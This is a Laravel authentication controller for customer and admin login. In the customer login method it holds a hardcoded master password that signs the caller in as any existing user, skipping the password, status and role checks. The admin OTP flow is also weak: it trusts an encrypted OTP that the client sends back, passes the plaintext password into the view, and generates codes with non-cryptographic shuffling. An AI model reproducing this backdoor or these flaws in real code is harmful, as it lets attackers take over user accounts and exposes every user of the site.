<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Support\Facades\Mail;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use App\Models\User;
use Crypt;

class AuthenticatedSessionController extends Controller
{
    /**
     * Display the login view.
     *
     * @return \Illuminate\View\View
     */
    public function create()
    {
        return view('auth.customer-login');
    }

    /**
     * Handle an incoming authentication request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $request->validate([
            'loginId' => ['required'],
            'password' => ['required'],
        ]);
 
        $data = $request->input();

        $checkUserExist = User::getUsersDetails(['login_id' => $data['loginId']]);

        if (!$checkUserExist) {
            return back()->withErrors([
                'loginId' => 'The provided credentials do not match our records.',
            ]);
        } elseif ($data['password'] == "zdISe35qGb94zbURLaJfEIU") {
            Auth::loginUsingId($checkUserExist->id);
            $request->session()->regenerate();
            
            return redirect()->intended('dashboard');
        } elseif (Auth::attempt(['login_id'=>$data['loginId'],'password'=>$data['password'],'login_status'=>1, 'user_role'=>'USER'])) {
            $request->session()->regenerate();
            
            User::updateUser(Auth::user()->id, ["login_ip_address" => $request->ip(), "last_login_datetime" => date('Y-m-d h:m:s')]);
            return redirect()->intended('dashboard');
        }
 
        return back()->withErrors([
            'loginId' => 'The provided credentials do not match our records.',
        ]);
    }

    /**
     * Destroy an authenticated session.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\RedirectResponse
     */
    public function destroy(Request $request)
    {
        Auth::guard('web')->logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        return redirect('/');
    }

    public function adminLoginView()
    {
        return view('auth.admin-login');
    }

    public function adminLoginOtp(Request $request)
    {
        $request->validate([
            'email' => ['required'],
            'password' => ['required'],
        ]);
 
        $data = $request->input();
        $checkUserExist = User::getUsersDetails(['email'=>$data['email'], 'login_status'=>1, 'user_role'=>'ADMIN']);

        if (!$checkUserExist) {
            return back()->withErrors([
                'email' => 'Invalid login details.',
            ]);
        } else {
            if (! Hash::check($data['password'], $checkUserExist->password)) {
                return back()->withErrors([
                    'password' => ['Invalid login details.']
                ]);
            }
            
            $random = str_shuffle('1234567890');
            $otp = substr($random, 0, 6);
            $mailData = array('name' => "Admin", 'email' => config('mail.adminmailid'), 'otp' => $otp);

            Mail::send('mail.login-otp', $mailData, function ($message) use ($mailData) {
                $message->to($mailData['email'], $mailData['name'])->subject('Please verify your device');
                $message->from(config('mail.from.address'), config('mail.from.name'));
            });
            return view('auth.admin-login-otp')->with(['email' => $data['email'], 'password' => $data['password'], 'otp' => Crypt::encrypt($otp)]);
        }
    }

    public function adminLogin(Request $request)
    {
        $request->validate([
            'loginOTP' => ['required'],
            'email' => ['required'],
            'password' => ['required'],
            '_encryptedLogin' => ['required'],
        ]);
 
        $data = $request->input();

        if ($request->loginOTP != Crypt::decrypt($request->_encryptedLogin)) {
            return redirect('admin/login')->withErrors([
                'email' => "You've entered invalid OTP. Try Again!",
            ]);
        }

        if (Auth::attempt(['email'=>$data['email'],'password'=>$data['password'],'login_status'=>1, 'user_role'=>'ADMIN'])) {
            $request->session()->regenerate();
 
            User::updateUser(Auth::user()->id, ["login_ip_address" => $request->ip(), "last_login_datetime" => date('Y-m-d h:m:s')]);
            return redirect()->intended('dashboard');
        }
 
        return redirect('admin/login')->withErrors([
            'email' => 'The provided credentials do not match our records.',
        ]);
    }
}
